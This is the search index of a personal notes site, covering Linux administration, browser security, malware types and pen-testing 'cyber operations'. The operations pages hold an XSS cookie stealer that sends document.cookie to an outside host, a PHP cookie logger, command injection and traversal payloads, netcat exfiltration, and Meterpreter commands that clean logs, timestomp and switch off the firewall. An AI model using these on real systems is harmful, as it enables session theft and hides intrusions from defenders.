var relearn_search_index = [
  {
    "breadcrumb": "Phenix66 \u003e Linux",
    "content": "Boot Process POST Bootloader GRUB: Stage 1 # Loads stage 1.5 Stage 1.5 # Provides filesystem support, loads stage 2 Stage 2 # Contains the bulk of the bootloader, allows users to select kernel and kernel boot options. Loads kernel into RAM Solaris (pre-10 1/06) mboot pboot bootblk Kernel Init initrd or initramfs Provides temp filesystem required to load kernel modules and drivers User Space Init SysV Serial, starts processes one after the other When first booting up, kill scripts will generally not be ran init (PID 1) # Ancestor of all other processes /etc/inittab Defines default run level Tells the system what to do when rebooted or run level is changed Red Hat: /etc/rc.d/ Startup scripts /etc/rc.d/init.d/ Contains actual service control scripts /etc/rc.d/rc.sysinit Config to be run before other services. Time zone, hostname, etc /etc/rc.d/rc.local Config to be run after services are up. Typically system specific such as VPNs Debian: /etc/rc\u003c#\u003e.d/ /etc/init.d/rcS equivalent to rc.sysinit upstart Can run steps in parallel Init reads .conf files in /etc/init One of those scripts runs /etc/rc.d/rc script for desired runlevel. This provides the SysV backwards compatibility systemd Can run steps in parallel /usr/lib/systemd/systemd (PID 1) # May also be /sbin/init (symbolic link to systemd) Units Service # Daemons Socket # IPC and network Target # Similar to runlevel, groups units together during boot up Located in /etc/systemd/system and /usr/lib/systemd/system Units in /etc take precedence States Load Did it successfully read the unit’s configuration file? Active Is it running? Sub Low-level unit activation state /etc/systemd/system/default.target Symbolic link to default target SMF # Solaris 10+ Can run steps in parallel Milestones Replaces runlevels /etc/svc/repository.db Config database Shells Types https://phoenixnap.com/kb/linux-shells\nhttps://www.freecodecamp.org/news/linux-shells-explained/\nProfile Loading https://youngstone89.medium.com/unix-introduction-bash-startup-files-loading-order-562543ac12e9\nhttps://access.redhat.com/solutions/452073\nLogin Directories Filesystem Links IPTables ",
    "description": "",
    "tags": null,
    "title": "Basics",
    "uri": "/linux/basics/index.html"
  },
  {
    "breadcrumb": "Phenix66",
    "content": "9001 times better than Windows.\nMisc Random reference I saved for some reason, IDK I don’t use VIM: http://vimregex.com/\nFix perl locale message update-locale LC_CTYPE=en_US.UTF-8\nShow current shell ps -p $$\nRemoving a Git submodule git submodule deinit \u003cpath_to_submodule\u003e git rm \u003cpath_to_submodule\u003e git commit-m \"Removed submodule \" rm -rf .git/modules/\u003cpath_to_submodule\u003e",
    "description": "",
    "tags": null,
    "title": "Linux",
    "uri": "/linux/index.html"
  },
  {
    "breadcrumb": "Phenix66 \u003e Linux",
    "content": "Disabling the builtin Bluetooth adapter Almost every gaming motherboard comes with built in WiFi and BT now. The BT adapter almost always sucks too.\nFind the vender and model ID with lsusb $ lsusb \u003c... lines omitted ...\u003e Bus 001 Device 004: ID 0e8d:0616 MediaTek Inc. Wireless_Device \u003c... lines omitted ...\u003e Add a new file to /etc/udev/rules.d/ SUBSYSTEM==\"usb\", ATTRS{idVendor}==\"0e8d\", ATTRS{idProduct}==\"0616\", ATTR{authorized}=\"0\"Remove snapd Flatpak is way better.\nRemove all existing snaps. The order is important as you cannot remove a snap that is a dependency of another installed snap. You also cannot remove multiple snaps in one command apparently. snap list snap remove --purge gnome-42-2204 snap remove --purge firefox snap remove --purge gtk-common-theme snap remove --purge core22 snap remove --purge bare snap remove --purge snapd Remove snapd sudo apt remove --autoremove snapd Add the following to /etc/apt/preferences.d/nosnap.pref to ensure snap doesn’t get revived by apt. Package: snapd Pin: release a=* Pin-Priority: -10 Install flatpak and profit Fix Flatpak Firefox fonts Add the following to ~/.var/app/org.mozilla.firefox/config/fontconfig/fonts.conf\n\u003c?xml version='1.0'?\u003e \u003c!DOCTYPE fontconfig SYSTEM 'fonts.dtd'\u003e \u003cfontconfig\u003e \u003c!-- Disable bitmap fonts. --\u003e \u003cselectfont\u003e \u003crejectfont\u003e \u003cpattern\u003e \u003cpatelt name=\"scalable\"\u003e \u003cbool\u003efalse\u003c/bool\u003e \u003c/patelt\u003e \u003c/pattern\u003e \u003c/rejectfont\u003e \u003c/selectfont\u003e \u003c/fontconfig\u003e",
    "description": "",
    "tags": null,
    "title": "My System Config",
    "uri": "/linux/sysconfig/index.html"
  },
  {
    "breadcrumb": "Phenix66 \u003e Cyber Operations",
    "content": "Proxychains Greatly speeds up scanning\nhttps://www.hackwhackandsmack.com/?p=1021\nseq 128 255 | xargs -P 50 -I{} proxychains nmap -p 22 -sT -Pn --open -n -T4 --min-rate 1 --oG proxy_nmap --append-output 10.20.101.{}",
    "description": "",
    "tags": null,
    "title": "Reconnaissance",
    "uri": "/ops/recon/index.html"
  },
  {
    "breadcrumb": "Phenix66 \u003e Linux",
    "content": "Update drive name and partition number as appropriate.\ngrowpart /dev/sda 3 pvresize /dev/sda3 lvresize -l +100%FREE --resizefs ubuntu-vg/ubuntu-lv",
    "description": "",
    "tags": null,
    "title": "Ubuntu - Grow Partition",
    "uri": "/linux/ubuntu/index.html"
  },
  {
    "breadcrumb": "Phenix66",
    "content": "Be proactive instead of reactionary\n",
    "description": "",
    "tags": null,
    "title": "Cybersecurity",
    "uri": "/security/index.html"
  },
  {
    "breadcrumb": "Phenix66 \u003e Cyber Operations",
    "content": "The Basics Determining potential security posture Are they using an up to date OS? What kind of personal security products are installed? Are they using a free antivirus tool, or are they using an enterprise-based commercial antivirus tool? Is the system patched up to date? Is there a bunch of bloatware? Or is the box rather Spartan, as a corporate load should typically be? Tradecraft Rules Rule #1: Do No Harm Never leave a target’s equipment less secure than when you found it Do not patch vulnerable software or install defensive tools such as wireshark or nmap Never knowingly disrupt a target’s network or system without express permission from a competent authority This is not your personal computer. Rule #2: No packets directly between source and target Rule #3: Have a clue Always have a plan and a goal Execute your operation quietly Know when to get help Rule #4: Do not scan everything under the Sun Noise kills Rule #5: Upload wisely Upload only what you need Use single binaries Do not use public packages Rule #6: Clean your logs Do not remove every log Clean only entries related to your activity Reset file time to last entry Rule #7: Practice and don’t run untested tools Never practice on a live system Review all code before running, even in a lab Rule #8: Situational Awareness Always be concerned about compromising your tools, techniques, and methods Rule #9: Check yourself, before you wreck yourself Check your ego at the door Ask for help if you need it Exfiltration Strategies Port targeting Blend in with environment Redirector selection Ports should make sense (80, 443, 25, etc) Firewalls, proxies, and other systems may affect traffic on these ports Avoid these ports: 135 \u0026 445 (NetBIOS, SMB) 1433 and other SQL ports 6667 (IRC) 666, 1337, 4444, 6666, 31337, 12345 (Known malware, hacking activity) Consider geographic factors of redirector File manipulation Match the modified time to other files Name your tools to resemble normal processes Cleaning up Remove temporary files, tools, tool generated logs, etc Did you schedule a job in Windows? If so, it was probably logged. Delete those logs. Did you substitute user (su) on a UNIX system? If so, it was probably logged. Remove those entries. Did you cause a core dump or a mini-dump? If so, delete those dump files. Are you responsible for any hanging processes? If so, kill those processes. Clean the prefetch directory Exploitation through tunnels Additional considerations need to be taken into account, such as latency Not all tools will work through a tunnel the same way Don’t forget to change “RPORT” to the tunnel redirector! Privilege Escalation Rules to remember Never escalate to a critical process unless you know what you are doing Know your privileges (flags) User processes go away when a user logs off Shellcode Written in Assembly code Techniques Find socket Uses an existing connection between you and the target Reverse shell Port binding Command execution Useful when you do not need a network connection File transfer Multi-stage Syscall proxy Requires few processes and network connections Allows access to core OS functions Executes in a loop, strings together requests Usually part of a framework type of application Process injection Code Injection Overflow Types Buffer Stack Heap Integer Off-by-one Error Heap Spraying Not an exploit method Payload delivery technique DLL Injection Windows Hooking Calls code when a specific event occurs Commonly used for Keylogging AppInit Key Runs with user32.dll CreateRemoteThread Function Injects DLL into running process Reflective DLL Injection Injects a loader in the process Advantages: Not registered or listed in process modules No hooking Fileless Can be found in memory forensics DLL Path Hijacking Search-order hijacking Countermeasures Endpoint Security - Hook into functions typically used for injection Code signing Backdoor Methods Batch files/init scripts Autorun keys AppInit Key DLL injection Trojan Application Install as a Service Load as a driver Metasploit Some local commands can be ran from the framework console /usr/share/metasploit-framework/ Payloads Bind - Shell connects directly to victim Reverse - Victim calls back to you “DisablePayloadHandler” Prevents MS from automatically attempting to connect the payload You can then use exploit/multi/handler to “call forward” Masquerades Logging into a remote access service with valid credentials that are not yours Implants Backdoor Requires the operator to connect to it May require 2 tunnels, both a forward and reverse. One for the trigger packet and one for the callback. Beacon Periodically attempts to initiate a connection to the operator Some Easy Exploits Non-secure C Takes advantage of a poorly written application.\nFirst %s is taken as input then our code executes independently. Using this method you could print sensitive values that may only be normally accessible by the application.\n%s%sprintf(password)%sWeb Code Injection (for input that will be processed directly in a shell) \u003cnormal input\u003e \u0026 \u003ccommand\u003eIIS 6, circumvent file extension validation Add ;.jpg (or other valid ext) to file being uploaded\nPHP Directory Traversal index.php?page=./../../../fileCookies \u003cscript\u003ewindow.location='http://10.1.1.1/?'+document.cookie;\u003c/script\u003eSimple Cookie Stealer Host \u003c?php $cookie=$_GET[\"cookie\"]; $log=fopen(\"log.txt\", “a”); fwrite($log, $cookie .\"\\n\"); fclose($log); ?\u003ePhish [url]=\u003cscript\u003ewindow.location='my_url/cookie_stealer.php?cookie='%2bdocument.cookie;\u003c/script\u003eXSS Find vulns in page such as \u003curl\u003e?search= Test input for sanitation Exploit! \u003cscript\u003e[command](\"[code]\");\u003c/script\u003e Ex: http://www.google.com/page.html?default=\u003cscript\u003ealert(\"Hacked!\");\u003c/script\u003e",
    "description": "",
    "tags": null,
    "title": "Exploitation",
    "uri": "/ops/exploitation/index.html"
  },
  {
    "breadcrumb": "Phenix66",
    "content": "You got the pen-testing agreement in writing I hope.\n",
    "description": "",
    "tags": null,
    "title": "Cyber Operations",
    "uri": "/ops/index.html"
  },
  {
    "breadcrumb": "Phenix66 \u003e Cyber Operations",
    "content": "Covering Tracks Potential Windows logged locations Windows Event Logs System Application Security Application Logs Such as SQL error or IIS Server logs if you exploited a specific application Windows Firewall Logs WMI Trace Logs Prefetch Microsoft Error Debugger Mechanism Can create a memory dump when a program crashes XP: Dr. Watson Vista+: Windows Error Reporting Potential *Nix logged locations /var/log .bash_history Normally does not get wrote until the shell is closed out utmp, wtmp, btmp Binary, cannot be edited without custom tools Core debugging Run “ulimit -c” to determine if it’s enabled /core Windows Meterpreter run event_manager -l \u003clog\u003e -f \u003cevent ID\u003e run event_manager -c \u003clog\u003e run event_manager -IClean firewall log run multicommand -cl \"findstr \\\"\u003cstring\u003e\\\" c:\\\\windows\\\\system32\\\\logfiles\\\\firewall\\\\pfirewall.log\" run multicommand -cl \"cmd /c findstr /V \\\"\u003cstring\u003e\\\" c:\\\\windows\\\\pfirewall.log \u003e c:\\\\windows\\\\temp\\\\log.tmp\" ps -U \u003cuser\u003e (Look for logon.scr to indicated screensaver is running) run multicommand -cl \"netsh firewall set opmode disable\" run multicommand -cl \"cmd /c type log.tmp | find /c /v \\\"\\\"\" (Get line count) run multicommand -cl \"cmd /c more log.tmp +\u003cabove result - 1\u003e\" (Get last entry) run multicommand -cl \"cmd /c move c:\\\\windows\\\\temp\\\\log.tmp c:\\\\windows\\\\system32\\\\logfiles\\\\firewall\\\\pfirewall.log\" timestomp -m \"MM/DD/YYYY HH:MM:SS\" c:\\\\windows\\\\system32\\\\logfiles\\\\firewall\\\\pfirewall.log run multicommand -cl \"netsh firewall set opmode enable\"Find crash dumps run multicommand -cl \"cmd /c dir c:\\\\*.*dmp /S /A\"List directory contents, oldest to newest write time run multicommand -cl \"cmd /c dir /A /od /tw\"Get logs from last 30 minutes run multicommand -cl \"cmd /c psloglist.exe -m 30 \u003clogname\u003e /accepteula\"*Nix find /var/log -type f -mmin -30 2\u003e /dev/nullPrevent shell history unset HISTFILEClean plain text logs grep -v \"\u003cstring\u003e\" /var/log/\u003cfile\u003e \u003e /tmp/log.clean cp /tmp/log.clean /var/log/\u003cfile\u003e (Copying preserves permissions!) touch -t YYYYMMDDHHMM.SS \u003cfile\u003e rm -rf /tmp/log.cleanFind all logs with your IP find /var/log -type f -exec grep 'ip' /dev/null {} +View cron jobs for i in `find /etc/cron* -type f | cut -d\":\" -f 1`; do echo; echo \"==========$i==========\"; ls -l \"$i\"; cat -n \"$i\" 2\u003e\u00261;doneFiles \u0026 File System Find all SUID files find / -perm -4000 2\u003e/dev/nullPassword Cracking John unshadow passwd shadow \u003e unshadowed.txtBackup files /etc/passwd- /etc/shadow-",
    "description": "",
    "tags": null,
    "title": "Post Exploitation",
    "uri": "/ops/post_exploitation/index.html"
  },
  {
    "breadcrumb": "Phenix66 \u003e Cyber Operations",
    "content": "SSH Tunnels Disabling SSH DNS lookup on redirector boxes can greatly speed up the response time and speed through the chain ssh user@hop1 -NfL lport1:hop2:hop2portFrom SSH sessions:\n~C # Drops into SSH command line -L[bind addr]:\u003cport\u003e:\u003cforward addr\u003e:\u003cport\u003e # Add a forward tunnel -KL:\u003cport\u003e # Remove a forward tunnel -R\u003cport\u003e:\u003cforward addr\u003e:\u003cport\u003e # Add a reverse tunnel -KR:\u003cport\u003e # Remove a reverse tunnel ~# # List forwarded connectionsSSH Proxy Tunnel ssh user@127.0.0.1 -p tunnel_port -NfD proxy_portForward SSH Tunnels Create first tunnel ssh \u003cuser\u003e@\u003cfirsthop\u003e -NfL \u003clport1\u003e:\u003cnexthop\u003e:\u003crport\u003e Tunnel through previous, continue to chain to add more hops to the route ssh \u003cuser\u003e@localhost -p \u003clport1\u003e -NfL \u003clport2\u003e:\u003cnexthop\u003e:\u003crport2\u003eReverse SSH Tunnels By default reverse tunnels listen globally on all interfaces Configuring a reverse tunnel does NOT start a listener on the local machine\nSends all traffic received on remote host’s rport to your localhost’s lport\nssh \u003cuser\u003e@\u003ctarget\u003e -NfR \u003crport\u003e:localhost:\u003clport\u003eSSH control sockets Create the socket ssh -M -S /tmp/\u003cname\u003e \u003cuser\u003e@\u003cip\u003e Use a socket ssh -S /tmp/\u003cname\u003e thispartisignoredbutrequired@127 scp -o ControlPath=/tmp/\u003cname\u003e thispartisignoredbutrequired@127:\u003cfile\u003e \u003cdest\u003e",
    "description": "",
    "tags": null,
    "title": "Tunneling",
    "uri": "/ops/tunneling/index.html"
  },
  {
    "breadcrumb": "Phenix66 \u003e Cyber Operations",
    "content": "Basics Redirectors vs SSH tunnels Advantages Smaller executable size Can easily be deployed to systems that do not have SSH available Disadvantages Limited functionality No multiplexing Noiser Rewrites addressing info on packets instead re-encapsulating Applications fpipe socat portproxy iptables Redirect TCP X X X X Redirect UDP X X Convert TCP \u003c\u003e UDP X Redirect IPv4 X X X X Redirect IPv6 X X * with ip6tables Convert IPv4 \u003c\u003e IPv6 X X Masks source IP address X X X No open socket on redirector X Requires admin privileges X X Socat Supports TCP, UDP, ICMP, and RAW IP traffic\nsocat TCP-LISTEN:8080 TCP-CONNECT:\u003cip\u003e:80UDP forwarder over TCP tunnel socat udp-listen:137 tcp-connect:127.0.0.1:1337 socat tcp-listen:1337 udp-connect:198.18.30.12:137Generate SSL cert for HTTPS openssl req -new -x509 -days 365 -nodes -out cert.pem -keyout cert.key socat OPENSSL-LISTEN:443,cert=/cert.pem -fpipe fpipe -l \u003clport\u003e -r \u003crport\u003e \u003cip\u003eportproxy Native option on Windows (you do not need to bring it)\nOnly supports TCP\nnetsh interface portproxy show all netsh interface portproxy set v4tov4 listenaddress=\u003cip\u003e listenport=\u003cport\u003e connectaddress=\u003cip\u003e connectport=\u003cport\u003e netsh interface portproxy resetIPtables Native option on Linux (you do not need to bring it)\nNetwork forwarding must be enabled\necho “1” \u003e /proc/sys/net/ipv4/ip_forwardChanges destination from redirector to target 2\niptables -t nat -A PREROUTING -p tcp --dport \u003cport\u003e -d \u003credirector-ip\u003e -s \u003ctgt1-ip\u003e -j DNAT --to-destination \u003ctgt2-ip\u003e:\u003cport\u003eChanges source of the packet to the redirector’s ip, masking the true source\niptables -t nat -A POSTROUTING -p tcp --dport \u003cport\u003e -d \u003ctgt2-ip\u003e -s \u003ctgt1-ip\u003e -j SNAT --to-source \u003credirector-ip\u003eRedirect to SSH reverse tunnel listening on localhost (handy when ‘GatewayPorts’ is disabled in sshd_config) By default, IP forwarding will not forward traffic to localhost\necho “1” \u003e /proc/sys/net/ipv4/conf/all/route_localnet iptables -t nat -A PREROUTING -p tcp --dport \u003cport\u003e -d \u003credirector-ip\u003e -s \u003ctgt1-ip\u003e -j DNAT --to-destination 127.0.0.1:\u003cSSH -R port\u003eTroubleshooting No packet is forwarded to destination Problem: The iptables filter functionality must allow the redirected traffic Diagnosis: Check iptables filter statistics for a blocking rule/policy incrementing Solution: Add iptables filter rules allowing traffic\nProblem: The redirector must be configured to route IP packets Diagnosis: No iptables filter statistics will increment, check kernel parameters Solution: Update kernel parameters to allow routing\nConnection to destination is initiated, but no SYN-ACK is received Problem: Destination must be configured to route traffic to source traffic to source back through redirector, with no filtering in the path Solution: Add a SNAT rule in the POSTROUTING chain to change the source address from the originator to the redirector\nConnection to destination is initiated, but SYN-ACK is not forwarded to source Problem: Redirector must have conntrack kernel module installed Solution: Add SNAT rule that undoes the DNAT rule for traffic returning to the source\n",
    "description": "",
    "tags": null,
    "title": "Redirection",
    "uri": "/ops/redirection/index.html"
  },
  {
    "breadcrumb": "Phenix66 \u003e Cyber Operations",
    "content": "Serving files php -S 0.0.0.0:80 python -m SimpleHTTPServer [\u003cport\u003e] auxilaiary/server/tftp (MSF)Netcat nc -lvp \u003cport\u003e \u003e \u003coutfile\u003e nc \u003cip\u003e \u003cport\u003e \u003c \u003cinfile\u003e nc -lvp \u003cport\u003e \u003c \u003cinfile\u003e nc \u003cip\u003e \u003cport\u003e \u003e \u003coutfile\u003eFTP ftp \u003cip\u003e get \u003cfile\u003eTFTP tftp -i \u003cip\u003e GET \u003cfile\u003e",
    "description": "",
    "tags": null,
    "title": "Exfiltration",
    "uri": "/ops/exfiltration/index.html"
  },
  {
    "breadcrumb": "Phenix66",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Categories",
    "uri": "/categories/index.html"
  },
  {
    "breadcrumb": "Phenix66 \u003e Cybersecurity",
    "content": "Basics Types Virus Can copy itself to infect a computer Infects files on USBs, CDs, network drives, etc to spread Worm Primarily replicate on networks Typically do not require any user interaction Trojan Embedded in other applications Not self-replicating Requires a user to execute infected program User-mode Rootkit Unix: Modified executables or wrapper scripts are used to hide malicious activity from the output of certain commands, such as netstat Windows: Intercept a user’s system calls and modify the information returned Kernel-mode Rootkit Often a driver or kernel library Can hide processes, files, directories, and network connections Backdoor Allow for remote access to infected system 2 types Listening Beacon (reverse connection) Dropper Install malware on a target Typically self-delete upon completion 2 types Single-stage: Contains the malware to be installed in the same package as the dropper Stager: The dropper downloads the malware from somewhere else Keylogger Captures all typed input Flooders (DDoS) Generates massive amounts of network traffic to cause a DoS Distributed Reflective Denial of Service (DRDoS) SYN packets are sent with a spoofed source IP to legitimate servers Logic Bomb Performs malicious function after certain conditions are met Non-malicious versions are “Easter Eggs” Network Sniffer Allow capturing and examination of network traffic Spyware Collects information about a user and transmits it somewhere on the Internet Adware Popup ads Scareware Attempts to get a user to perform some action by convincing them their computer is infected Browser Malware Installed as plugins or extensions, aka Browser Helper Objects May be installed by surfing to an infected website or included with a 3rd-party program installation Spam Unsolicited email Phishing The process of attempting to fraudulently obtain sensitive user information Typically use legitimate looking emails to get a user to click a malicious link Botnets Collection of bots (zombies) Spread with worm functionality Communication IRC Bots contact a central chat server to receive commands HTTP Bots check specific web pages for embedded commands May also use FB, Twitter, etc P2P Decentralized Windows Malware Analysis Research (Internet) Look into suspicious files names Use a sandbox environment Download executables Find DLLs Inspect open file handles Check common registry locations Find ports listening for network communications Inspect suspicious timestamps Check for unsigned files Verify file hashes Check for promiscuous mode Use a hex editor Dump the memory Report your findings Analyzing Useful commands strings handle hexeditor \u003coutput_file\u003eUnpack an exe\nupx -d \u003cexecutable\u003e -o \u003coutput_file\u003eFind trojanized UNIX commands\nwhile IFS=: read -d: -r path; do echo $path; ls -lAtrc --time-style=long-iso $path | uniq -c -f 5 -w 17; done \u003c\u003c\u003c \"${PATH:+\"${PATH}:\"}\"Finding ctime anomalies\nfor path in /etc/init.d /etc/rc*; do echo $path; ls -lHAtrc --time-style=long-iso $path | uniq -c -f 5 -w 11; done find / -name '*.service' | (while read -r path; do ls -lHAtrcd --time-style=long-iso $path; done) | uniq -c -f 5 -w 16Service files\nfind / -name '*.service' | (while read -r path; do ls -lHAtrcd --time-style=long-iso $path; done) | sort -k 6 | uniq -c -f 5 -w 16Hash a file in Windows\ncertutil -hashfile \u003cfile\u003e",
    "description": "",
    "tags": null,
    "title": "Malware",
    "uri": "/security/malware/index.html"
  },
  {
    "breadcrumb": "",
    "content": "A good portion of this site, if not all of it at the time you are reading this, is just me attempting to dump my notes that have moved from one note taking application to another over the years into a more permanent location. If something doesn’t make sense, well it might not to me anymore either!\n",
    "description": "",
    "tags": null,
    "title": "Phenix66",
    "uri": "/index.html"
  },
  {
    "breadcrumb": "Phenix66",
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tags",
    "uri": "/tags/index.html"
  },
  {
    "breadcrumb": "Phenix66 \u003e Cybersecurity",
    "content": "Internationalized Domain Names (IDNs) What is it: Domain names can use international characters that look like other English characters. Used commonly on phishing sites to further trick a user into thinking they are on a legitimate site. Displaying all domains in their “punycode” equivalents however prevents this entirely.\nIn-depth reads: https://krebsonsecurity.com/2018/03/look-alike-domains-and-visual-confusion/\nBrowsers that show punycode by default: Chrome Safari Internet Explorer Edge\nMozilla Firefox:\nNavigate to “about:config” Set “network.IDN_show_punycode” to “true” Pastejacking What is it: Allows a website to copy custom text/code to the clipboard when the user copies something else from the site. Commonly used when the content being copied is intended to be pasted into a command window or text editor such as VIM that would support commands/macros.\nGood PoC website: https://securelayer7.net/lab/pastejacking.html\nMore in-depth read: https://nakedsecurity.sophos.com/2016/05/26/why-you-cant-trust-things-you-cut-and-paste-from-web-pages/\n“But I already use a script blocker?” Doesn’t seem to make a difference in my experience. Pastejacking relies on “Clipboard events” that can run without Javascript being enabled if it was placed in the CSS code. Please note, you SHOULD be running a script blocker, some pastejacking does occur in Javascript and therefore would not be prevented via these methods.\nFirefox:\nNavigate to “about:config” Set “dom.event.clipboardevents.enabled” to “false” IE:\nTested with IE 11.1066.14393.0 on Windows 10 and it inherently blocked the attempt. Way to go MS for actually getting something right! Chrome:\nRequires extension, no known method of disabling clipboard events. Right-to-Copy extension allows you copy ONLY what is selected, but requires you to right-click -\u003e Copy instead of using Ctrl+C shortcut WebRTC Leaks What it is: WebRTC can leak your true IP address even when utilizing a VPN\nFirefox:\nNavigate to “about:config” Set “media.peerconnection.enabled” to “false” Adding CA Certificates NSSDB The following commands can be used to add certificates to the store used by Chrome and other chromium derivitives, such as VSCode.\nmkdir -p $HOME/.pki/nssdb certutil -d $HOME/.pki/nssdb -N --empty-password certutil -d $HOME/.pki/nssdb -A -t TC -n \"Descriptive comment\" -i /path/to/cert",
    "description": "",
    "tags": null,
    "title": "Web Browser Security",
    "uri": "/security/web_browsers/index.html"
  }
]
